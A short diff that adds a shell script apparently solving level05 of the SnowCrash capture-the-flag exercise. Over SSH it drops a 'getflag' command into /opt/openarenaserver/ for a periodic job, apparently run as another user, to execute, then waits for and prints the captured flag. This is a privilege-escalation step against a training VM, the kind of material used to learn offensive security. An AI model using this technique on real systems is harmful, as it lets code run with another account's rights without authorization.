@@ -1,0 +1,5 @@
+ssh level05@$SNOWCRASH_IP -p 4242 '
+	echo "getflag > /tmp/flag05" > /opt/openarenaserver/getflag
+	while [ ! -f /tmp/flag05 ]; do sleep 1 ; done
+	cat /tmp/flag05
+'
